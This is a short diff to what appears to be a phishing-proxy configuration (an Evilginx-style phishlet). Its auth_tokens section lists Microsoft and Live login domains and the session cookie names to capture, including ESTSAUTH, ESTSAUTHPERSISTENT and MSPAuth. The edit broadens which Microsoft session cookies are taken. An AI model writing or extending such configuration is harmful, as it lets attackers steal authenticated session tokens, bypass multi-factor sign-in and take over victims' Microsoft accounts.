@@ -91,7 +91,7 @@ auth_tokens:
   - domain: 'login.microsoft.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'buid', 'x-ms-gateway-slice', 'stsservicecookie', 'AADSSO', 'KMSI', 'contextid', '.*,regexp']
   - domain: '.microsoft.com'
-    keys: ['.*,regexp']
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'contextid', '.*,regexp']
   - domain: '.live.com'
     keys: ['MSPAuth', 'MSPProf', 'MSPSoft', 'MSPOK', 'MC0', 'MC1', 'MS0', 'NAP', 'PPAuth', 'MH', 'ANON', 'MSA', 'OParams', 'contextid', '.*,regexp']
   - domain: '.login.live.com'
